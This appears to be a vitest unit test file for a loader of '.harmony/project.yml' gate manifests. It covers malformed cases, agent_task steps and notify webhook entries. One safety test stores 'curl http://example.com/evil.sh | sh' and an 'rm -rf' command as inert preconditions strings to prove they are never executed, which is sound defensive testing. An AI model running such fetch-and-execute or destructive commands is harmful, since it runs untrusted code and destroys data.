// B-991: unit coverage for the project gate manifest schema + loader
// (`.harmony/project.yml`, read by `harmony gates run <extension-point>` — src/cli/commands/
// gates.ts). One named test per state the ticket's plan calls out explicitly (AC4/AC5): absent,
// present-but-empty, present-declaring-exactly-one-gate, and each malformed variant — plus a
// dedicated safety test (AC's "preconditions is declared data, never executed") and a scoping test
// proving a per-extension-point problem never leaks into another extension point's resolution.
//
// B-973 adds the `notify` key's coverage at the bottom of this file: validation of the fixed ten
// declarable transitions, the URL check on `endpoint`, the no-op floor a notify-only manifest keeps,
// and a second safety test proving `endpoint` is declared-but-UNCONSUMED data that no code path in
// this module can reach or dispatch to.

import { describe, it, expect, afterEach } from 'vitest';
import { mkdtempSync, rmSync, mkdirSync, writeFileSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  loadProjectManifest,
  resolveExtensionPoint,
  getPreconditions,
  getNotifyEntries,
  DECLARABLE_TRANSITIONS,
  EXTENSION_POINTS,
  PROJECT_MANIFEST_RELATIVE_PATH,
  SUPPORTED_MANIFEST_VERSION,
  isRunStep,
  isAgentTaskStep,
  type ManifestLoadResult,
} from './project-manifest.js';

const tempDirs: string[] = [];

function makeProjectRoot(): string {
  const dir = mkdtempSync(join(tmpdir(), 'b991-manifest-'));
  tempDirs.push(dir);
  return dir;
}

function writeManifest(projectRoot: string, contents: string): void {
  const dir = join(projectRoot, '.harmony');
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'project.yml'), contents, 'utf8');
}

afterEach(() => {
  for (const dir of tempDirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

describe('loadProjectManifest — manifest ABSENT', () => {
  it('returns { kind: "absent" } when .harmony/project.yml does not exist at all', () => {
    const root = makeProjectRoot();
    const result = loadProjectManifest(root);
    expect(result).toEqual({ kind: 'absent' });
  });

  it('every extension point resolves to an empty, clean step list off the absent floor (AC4)', () => {
    // There is no manifest to resolve an extension point AGAINST in the absent case — this locks
    // in the CONTRACT the CLI runner relies on: `kind !== 'ok'` on 'absent' means the runner takes
    // its own no-op branch without ever calling resolveExtensionPoint. Asserted here structurally.
    const root = makeProjectRoot();
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('absent');
  });
});

describe('loadProjectManifest — manifest PRESENT BUT EMPTY (declares a version, nothing else)', () => {
  it('parses cleanly and every extension point resolves to an empty step list', () => {
    const root = makeProjectRoot();
    writeManifest(root, `version: ${SUPPORTED_MANIFEST_VERSION}\n`);
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('ok');
    if (result.kind !== 'ok') return;
    expect(result.manifest).toEqual({ version: SUPPORTED_MANIFEST_VERSION });
    expect(getPreconditions(result.manifest)).toEqual([]);
    for (const point of ['build.before_pr', 'release.before_merge', 'verify.before_ack'] as const) {
      expect(resolveExtensionPoint(result, point)).toEqual({ outcome: 'steps', steps: [] });
    }
  });
});

describe('loadProjectManifest — manifest declaring exactly ONE gate (others stay no-ops)', () => {
  it('a manifest declaring only release.before_merge leaves build.before_pr and verify.before_ack empty', () => {
    const root = makeProjectRoot();
    writeManifest(
      root,
      [
        `version: ${SUPPORTED_MANIFEST_VERSION}`,
        'release:',
        '  before_merge:',
        '    - run: npm run build',
        '    - run: npm run verify:dist',
      ].join('\n'),
    );
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('ok');
    if (result.kind !== 'ok') return;

    const release = resolveExtensionPoint(result, 'release.before_merge');
    expect(release.outcome).toBe('steps');
    if (release.outcome !== 'steps') return;
    expect(release.steps).toEqual([{ run: 'npm run build' }, { run: 'npm run verify:dist' }]);
    expect(release.steps.every(isRunStep)).toBe(true);

    expect(resolveExtensionPoint(result, 'build.before_pr')).toEqual({ outcome: 'steps', steps: [] });
    expect(resolveExtensionPoint(result, 'verify.before_ack')).toEqual({ outcome: 'steps', steps: [] });
  });
});

describe('loadProjectManifest — malformed: invalid YAML', () => {
  it('classifies unparsable YAML text as reason "invalid-yaml", naming the file', () => {
    const root = makeProjectRoot();
    writeManifest(root, 'version: 1\n  build: [this is not: valid: yaml\n');
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('malformed');
    if (result.kind !== 'malformed') return;
    expect(result.problem.reason).toBe('invalid-yaml');
    expect(result.problem.file).toBe(join(root, PROJECT_MANIFEST_RELATIVE_PATH));
    expect(result.problem.message).toContain(result.problem.file);
  });
});

describe('loadProjectManifest — malformed: unknown top-level key', () => {
  it('classifies an unrecognized top-level key as reason "unknown-key", naming the offending key', () => {
    const root = makeProjectRoot();
    writeManifest(root, `version: ${SUPPORTED_MANIFEST_VERSION}\ntotally_made_up_key: true\n`);
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('malformed');
    if (result.kind !== 'malformed') return;
    expect(result.problem.reason).toBe('unknown-key');
    expect(result.problem.message).toContain('totally_made_up_key');
  });
});

describe('loadProjectManifest — malformed: missing version', () => {
  it('classifies a manifest with no version key at all as reason "missing-version"', () => {
    const root = makeProjectRoot();
    writeManifest(root, 'preconditions:\n  - "some note"\n');
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('malformed');
    if (result.kind !== 'malformed') return;
    expect(result.problem.reason).toBe('missing-version');
  });

  it('an entirely empty file (zero declarations, not even version) also classifies as "missing-version"', () => {
    const root = makeProjectRoot();
    writeManifest(root, '');
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('malformed');
    if (result.kind !== 'malformed') return;
    expect(result.problem.reason).toBe('missing-version');
  });
});

describe('loadProjectManifest — malformed: unrecognized version', () => {
  it('classifies a version this runner does not support as reason "unrecognized-version"', () => {
    const root = makeProjectRoot();
    writeManifest(root, 'version: 999\n');
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('malformed');
    if (result.kind !== 'malformed') return;
    expect(result.problem.reason).toBe('unrecognized-version');
    expect(result.problem.message).toContain('999');
  });
});

describe('loadProjectManifest — malformed: a run: step naming a script absent from disk', () => {
  it('classifies a missing script relative to the project root as reason "missing-script", scoped to that extension point only', () => {
    const root = makeProjectRoot();
    writeManifest(
      root,
      [
        `version: ${SUPPORTED_MANIFEST_VERSION}`,
        'build:',
        '  before_pr:',
        '    - run: ./scripts/does-not-exist.sh',
        'release:',
        '  before_merge:',
        '    - run: npm run build',
      ].join('\n'),
    );
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('ok');
    if (result.kind !== 'ok') return;

    const build = resolveExtensionPoint(result, 'build.before_pr');
    expect(build.outcome).toBe('blocked');
    if (build.outcome !== 'blocked') return;
    expect(build.problem.reason).toBe('missing-script');
    expect(build.problem.message).toContain('./scripts/does-not-exist.sh');

    // Never crashes any OTHER gate — release.before_merge's own (existing-command) step still
    // resolves normally even though build.before_pr is blocked.
    expect(resolveExtensionPoint(result, 'release.before_merge')).toEqual({
      outcome: 'steps',
      steps: [{ run: 'npm run build' }],
    });
  });

  it('a run: step naming a script that DOES exist on disk (relative to project root) resolves cleanly', () => {
    const root = makeProjectRoot();
    mkdirSync(join(root, 'scripts'), { recursive: true });
    writeFileSync(join(root, 'scripts', 'present.sh'), '#!/bin/sh\necho hi\n', 'utf8');
    writeManifest(
      root,
      [`version: ${SUPPORTED_MANIFEST_VERSION}`, 'build:', '  before_pr:', '    - run: ./scripts/present.sh'].join(
        '\n',
      ),
    );
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('ok');
    if (result.kind !== 'ok') return;
    expect(resolveExtensionPoint(result, 'build.before_pr')).toEqual({
      outcome: 'steps',
      steps: [{ run: './scripts/present.sh' }],
    });
  });

  it('a run: step whose first token has no path separator (e.g. "npm run build") is never existence-checked', () => {
    const root = makeProjectRoot();
    writeManifest(
      root,
      [
        `version: ${SUPPORTED_MANIFEST_VERSION}`,
        'release:',
        '  before_merge:',
        '    - run: npm run build',
        '    - run: npm run verify:dist',
      ].join('\n'),
    );
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('ok');
    if (result.kind !== 'ok') return;
    expect(resolveExtensionPoint(result, 'release.before_merge').outcome).toBe('steps');
  });
});

describe('loadProjectManifest — an agent_task: step (schema parses it, but it fails loud for its own extension point only)', () => {
  it('classifies a gate declaring an agent_task step as reason "unsupported-agent-task", scoped to that gate', () => {
    const root = makeProjectRoot();
    writeManifest(
      root,
      [
        `version: ${SUPPORTED_MANIFEST_VERSION}`,
        'verify:',
        '  before_ack:',
        '    - agent_task: "review the release notes for accuracy"',
        'build:',
        '  before_pr:',
        '    - run: npm run lint',
      ].join('\n'),
    );
    const result = loadProjectManifest(root);
    // The manifest as a WHOLE still parses (agent_task is a recognized keyword, per the ratified
    // schema) — this is NOT a whole-file malformed classification.
    expect(result.kind).toBe('ok');
    if (result.kind !== 'ok') return;

    const verify = resolveExtensionPoint(result, 'verify.before_ack');
    expect(verify.outcome).toBe('blocked');
    if (verify.outcome !== 'blocked') return;
    expect(verify.problem.reason).toBe('unsupported-agent-task');
    expect(verify.problem.message).toContain('agent_task');

    // Other extension points (build.before_pr here) are completely unaffected.
    expect(resolveExtensionPoint(result, 'build.before_pr')).toEqual({
      outcome: 'steps',
      steps: [{ run: 'npm run lint' }],
    });
  });

  it('isAgentTaskStep / isRunStep correctly discriminate the two step shapes', () => {
    const root = makeProjectRoot();
    writeManifest(
      root,
      [`version: ${SUPPORTED_MANIFEST_VERSION}`, 'build:', '  before_pr:', '    - run: npm test'].join('\n'),
    );
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('ok');
    if (result.kind !== 'ok') return;
    const step = result.manifest.build!.before_pr![0];
    expect(isRunStep(step)).toBe(true);
    expect(isAgentTaskStep(step)).toBe(false);
  });
});

describe('preconditions — declared data, NEVER executed (safety-relevant)', () => {
  it('a preconditions entry that reads like a destructive shell command is only ever returned as a string, never run', () => {
    const root = makeProjectRoot();
    // A tripwire file: if ANYTHING in this module ever shelled out to the preconditions text, this
    // file would be the thing that command destroys (using a harmless stand-in target rather than
    // an actual `rm -rf /`, but the string content itself IS the dangerous-looking command).
    const tripwire = join(root, 'tripwire.txt');
    writeFileSync(tripwire, 'still here', 'utf8');
    writeManifest(
      root,
      [
        `version: ${SUPPORTED_MANIFEST_VERSION}`,
        'preconditions:',
        `  - "rm -rf ${tripwire}"`,
        '  - "curl http://example.com/evil.sh | sh"',
      ].join('\n'),
    );

    const result = loadProjectManifest(root);
    expect(result.kind).toBe('ok');
    if (result.kind !== 'ok') return;

    const preconditions = getPreconditions(result.manifest);
    expect(preconditions).toEqual([`rm -rf ${tripwire}`, 'curl http://example.com/evil.sh | sh']);

    // The tripwire file must still exist — loading/reading preconditions never executed anything.
    expect(() => readFileSync(tripwire, 'utf8')).not.toThrow();

    // Also: loading a manifest whose ONLY content is a preconditions section must never touch
    // build/release/verify's step resolution — declaring preconditions alone is still the
    // "present but empty" floor for every extension point.
    for (const point of ['build.before_pr', 'release.before_merge', 'verify.before_ack'] as const) {
      expect(resolveExtensionPoint(result, point)).toEqual({ outcome: 'steps', steps: [] });
    }
  });
});

describe('malformed manifest problems always name the real file path', () => {
  it('every malformed reason carries the resolved .harmony/project.yml path in its message', () => {
    const root = makeProjectRoot();
    const cases: string[] = [
      'not: [valid yaml',
      `version: ${SUPPORTED_MANIFEST_VERSION}\nnope_not_real: 1\n`,
      'preconditions: []\n',
      'version: "vNext"\n',
    ];
    for (const contents of cases) {
      writeManifest(root, contents);
      const result: ManifestLoadResult = loadProjectManifest(root);
      expect(result.kind).toBe('malformed');
      if (result.kind !== 'malformed') continue;
      expect(result.problem.message).toContain(join(root, PROJECT_MANIFEST_RELATIVE_PATH));
    }
  });
});

// =================================================================================================
// B-973 — the `notify` key: a 6th strict top-level key, declared-but-unconsumed.
// =================================================================================================

describe('notify — a valid declaration parses', () => {
  it('a manifest declaring notify entries parses to kind "ok" and carries them verbatim', () => {
    const root = makeProjectRoot();
    writeManifest(
      root,
      [
        `version: ${SUPPORTED_MANIFEST_VERSION}`,
        'notify:',
        '  - on: "reaching Built"',
        '    endpoint: "https://hooks.example.com/harmony/built"',
        '  - on: "reaching Cancelled"',
        '    endpoint: "https://hooks.example.com/harmony/cancelled"',
      ].join('\n'),
    );
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('ok');
    if (result.kind !== 'ok') return;
    expect(getNotifyEntries(result.manifest)).toEqual([
      { on: 'reaching Built', endpoint: 'https://hooks.example.com/harmony/built' },
      { on: 'reaching Cancelled', endpoint: 'https://hooks.example.com/harmony/cancelled' },
    ]);
  });

  it('every one of the ratified ten transitions is accepted (and Captured / Idea are NOT)', () => {
    const root = makeProjectRoot();
    for (const transition of DECLARABLE_TRANSITIONS) {
      writeManifest(
        root,
        [
          `version: ${SUPPORTED_MANIFEST_VERSION}`,
          'notify:',
          `  - on: "${transition}"`,
          '    endpoint: "https://hooks.example.com/harmony"',
        ].join('\n'),
      );
      expect(loadProjectManifest(root).kind).toBe('ok');
    }
    expect(DECLARABLE_TRANSITIONS).toHaveLength(10);
    for (const notDeclarable of ['reaching Captured', 'reaching Idea']) {
      writeManifest(
        root,
        [
          `version: ${SUPPORTED_MANIFEST_VERSION}`,
          'notify:',
          `  - on: "${notDeclarable}"`,
          '    endpoint: "https://hooks.example.com/harmony"',
        ].join('\n'),
      );
      const result = loadProjectManifest(root);
      expect(result.kind).toBe('malformed');
      if (result.kind !== 'malformed') continue;
      expect(result.problem.reason).toBe('unknown-transition');
    }
  });
});

describe('notify — malformed: an unrecognized transition is WHOLE-FILE malformed', () => {
  it('classifies a bad `on` value as reason "unknown-transition", naming the file, the offending value and the recognized ten, on ONE line', () => {
    const root = makeProjectRoot();
    writeManifest(
      root,
      [
        `version: ${SUPPORTED_MANIFEST_VERSION}`,
        'release:',
        '  before_merge:',
        '    - run: npm run build',
        'notify:',
        '  - on: "reaching Shipped"',
        '    endpoint: "https://hooks.example.com/harmony"',
      ].join('\n'),
    );
    const result = loadProjectManifest(root);

    // WHOLE-FILE, not scoped: notify has no extension-point invocation, so a scoped stepErrors
    // entry would never be printed by anything and the typo would fail SILENTLY.
    expect(result.kind).toBe('malformed');
    if (result.kind !== 'malformed') return;
    expect(result.problem.reason).toBe('unknown-transition');
    expect(result.problem.file).toBe(join(root, PROJECT_MANIFEST_RELATIVE_PATH));
    expect(result.problem.message).toContain(result.problem.file);
    expect(result.problem.message).toContain('reaching Shipped');
    for (const transition of DECLARABLE_TRANSITIONS) {
      expect(result.problem.message).toContain(transition);
    }
    // ONE line — the PreToolUse hook (hooks/pretooluse-gate.sh) prints this as denial text.
    expect(result.problem.message).not.toContain('\n');
  });
});

describe('notify — malformed: a non-URL endpoint', () => {
  it('classifies a relative-path endpoint as reason "invalid-shape" (the zod url() check), naming the file', () => {
    const root = makeProjectRoot();
    writeManifest(
      root,
      [
        `version: ${SUPPORTED_MANIFEST_VERSION}`,
        'notify:',
        '  - on: "reaching Verified"',
        '    endpoint: "/webhooks/verified"',
      ].join('\n'),
    );
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('malformed');
    if (result.kind !== 'malformed') return;
    expect(result.problem.reason).toBe('invalid-shape');
    expect(result.problem.message).toContain(join(root, PROJECT_MANIFEST_RELATIVE_PATH));
  });

  it('classifies an unknown extra key inside a notify entry as reason "invalid-shape" (the entry schema is .strict())', () => {
    const root = makeProjectRoot();
    writeManifest(
      root,
      [
        `version: ${SUPPORTED_MANIFEST_VERSION}`,
        'notify:',
        '  - on: "reaching Verified"',
        '    endpoint: "https://hooks.example.com/harmony"',
        '    retries: 3',
      ].join('\n'),
    );
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('malformed');
    if (result.kind !== 'malformed') return;
    expect(result.problem.reason).toBe('invalid-shape');
  });
});

describe('notify — a notify-only manifest still floors every extension point (AC5)', () => {
  it('declaring notify alone leaves build/release/verify resolving to empty, clean step lists', () => {
    const root = makeProjectRoot();
    writeManifest(
      root,
      [
        `version: ${SUPPORTED_MANIFEST_VERSION}`,
        'notify:',
        '  - on: "reaching Deployed"',
        '    endpoint: "https://hooks.example.com/harmony/deployed"',
      ].join('\n'),
    );
    const result = loadProjectManifest(root);
    expect(result.kind).toBe('ok');
    if (result.kind !== 'ok') return;
    expect(result.stepErrors).toEqual({});
    for (const point of EXTENSION_POINTS) {
      expect(resolveExtensionPoint(result, point)).toEqual({ outcome: 'steps', steps: [] });
    }
  });
});

describe('notify endpoint — declared data, NEVER reached (safety-relevant, mirrors the preconditions tripwire)', () => {
  it('a notify endpoint pointing at a URL is only ever returned as a string — no consumer exists, no network call is made, and `notify` is not an extension point', () => {
    const root = makeProjectRoot();
    // The tripwire: a file that a dispatching implementation would have had to read this manifest
    // to find. Nothing in this module resolves `notify` to ANY action, so it stays untouched — the
    // same shape of proof the preconditions test above uses for shell execution.
    const tripwire = join(root, 'notify-tripwire.txt');
    writeFileSync(tripwire, 'still here', 'utf8');
    writeManifest(
      root,
      [
        `version: ${SUPPORTED_MANIFEST_VERSION}`,
        'notify:',
        '  - on: "reaching Verified"',
        `    endpoint: "https://127.0.0.1:1/${'harmony-should-never-be-called'}"`,
      ].join('\n'),
    );

    const result = loadProjectManifest(root);
    expect(result.kind).toBe('ok');
    if (result.kind !== 'ok') return;

    // 1. The endpoint comes back as a plain string, nothing more.
    expect(getNotifyEntries(result.manifest)).toEqual([
      { on: 'reaching Verified', endpoint: 'https://127.0.0.1:1/harmony-should-never-be-called' },
    ]);

    // 2. `notify` is deliberately NOT an extension point — there is no resolveExtensionPoint path
    //    that could ever invoke it. This is the STRUCTURAL discharge of "no network activity":
    //    there is no consumer to suppress.
    expect(EXTENSION_POINTS as readonly string[]).not.toContain('notify');
    for (const point of EXTENSION_POINTS) {
      const resolution = resolveExtensionPoint(result, point);
      expect(resolution).toEqual({ outcome: 'steps', steps: [] });
    }

    // 3. The tripwire file is untouched — loading a notify declaration ran nothing at all.
    expect(readFileSync(tripwire, 'utf8')).toBe('still here');
  });
});
